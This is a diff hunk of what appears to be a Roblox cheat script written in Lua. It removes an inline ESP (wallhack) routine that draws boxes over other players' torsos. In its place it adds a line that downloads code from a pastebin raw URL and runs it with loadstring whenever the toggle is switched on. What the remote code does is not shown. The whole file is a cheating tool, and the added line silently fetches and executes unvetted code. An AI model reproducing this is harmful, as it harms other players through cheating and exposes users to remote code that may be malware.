@@ -157,56 +157,9 @@ Tab2:AddToggle({
 	Default = false,
 	Callback = function(state)
 if state then 
-        LineList = {}
-        espLoop = rs.RenderStepped:Connect(function()
-            for i,v in pairs(LineList) do
-                if v then
-                    v:Remove()
-                end
-            end
-            
-            local team = getTeam()
-
-            LineList = {}
-            if game.Workspace.Players:FindFirstChild(team) then
-                for i,v in pairs(game.Workspace.Players:FindFirstChild(team):GetChildren()) do
-                    local pos = v.PrimaryPart.Position
-                    local ScreenSpacePos, IsOnScreen = game.Workspace.CurrentCamera:WorldToViewportPoint(pos)
-                    
-                    a = game.Workspace.CurrentCamera:WorldToViewportPoint(v.Torso.CFrame:PointToWorldSpace(Vector3.new(width/2, height/2, 0)))
-                    b = game.Workspace.CurrentCamera:WorldToViewportPoint(v.Torso.CFrame:PointToWorldSpace(Vector3.new(-width/2, height/2, 0)))
-                    c = game.Workspace.CurrentCamera:WorldToViewportPoint(v.Torso.CFrame:PointToWorldSpace(Vector3.new(-width/2, -height/2, 0)))
-                    d = game.Workspace.CurrentCamera:WorldToViewportPoint(v.Torso.CFrame:PointToWorldSpace(Vector3.new(width/2, -height/2, 0)))
-                    
-                    a = Vector2.new(a.X, a.Y)
-                    b = Vector2.new(b.X, b.Y)
-                    c = Vector2.new(c.X, c.Y)
-                    d = Vector2.new(d.X, d.Y)
-                    
-                    if IsOnScreen then
-                        local Line = Drawing.new("Quad")
-                        Line.Visible = true
-                        Line.PointA = a
-                        Line.PointB = b
-                        Line.PointC = c
-                        Line.PointD = d
-                        Line.Color = EspColor
-                        Line.Thickness = 2
-                        Line.Transparency = 1
-                        
-                        LineList[#LineList+1] = Line
-                    end
-                end
-            end
-        end)
-    else
-        espLoop:Disconnect()
-        for i,v in pairs(LineList) do
-            v:Remove()
-        end
-        LineList = {}
-    end
-end
+       loadstring(game:HttpGet("https://pastebin.com/raw/nF4pQUn6", true))()
+       end
+       end
 
 })
 
